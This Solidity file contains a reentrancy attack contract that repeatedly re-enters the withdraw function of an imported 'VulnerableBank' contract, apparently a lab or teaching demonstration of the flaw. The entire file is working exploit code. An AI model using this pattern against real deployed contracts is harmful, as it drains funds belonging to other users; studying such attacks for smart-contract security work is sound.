// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract Attack {
    VulnerableBank public vulnerableBank;

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    // Fallback function to receive Ether and call withdraw
    fallback() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw(1 ether); // Re-enter the withdraw function
        }
    }

    // Start the attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum 1 Ether required to attack");
        vulnerableBank.deposit{value: msg.value}(); // Deposit into the vulnerable contract
        vulnerableBank.withdraw(1 ether); // Initial withdrawal
    }
}
